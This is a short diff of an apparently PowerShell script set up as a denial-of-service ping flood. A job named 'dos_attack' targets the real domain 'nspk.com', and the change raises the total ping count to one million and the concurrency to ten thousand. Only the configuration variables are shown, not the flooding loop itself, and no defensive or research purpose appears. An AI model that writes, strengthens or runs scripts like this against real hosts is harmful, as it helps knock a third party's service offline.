@@ -1,6 +1,6 @@
 ﻿$numberOfPings = 0;
-$maxNumberOfPings = 100000;
-$maxConcurrentPings = 1000;
+$maxNumberOfPings = 1000000;
+$maxConcurrentPings = 10000;
 $nameOfPingJob = 'dos_attack';
 $attackVictim = 'nspk.com';
 
